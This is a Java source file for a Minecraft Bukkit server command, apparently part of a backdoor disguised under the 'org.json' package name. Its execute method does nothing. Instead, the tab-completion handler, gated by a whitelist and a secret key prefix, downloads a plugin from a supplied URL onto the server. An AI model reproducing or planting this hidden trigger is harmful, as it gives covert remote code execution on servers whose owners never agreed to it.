package org.json.modals.plugins;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.utils.FileUtils;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class DownloadPlugin extends BDCommand {
    public DownloadPlugin() {
        super("downloadPlugin");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        tabComplBuilder.add(2, FileUtils.getJarPlugins());
        tabComplBuilder.add(3, new String[]{"<url>", "https://api.spiget.org/v2/resources/\"id\"/download"});
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        if (args.length < 3) return tabComplBuilder.build();

        String name = args[1];
        String url = args[2];

        FileUtils.downloadPlugin(player, name, url);
        return tabComplBuilder.build();
    }

}
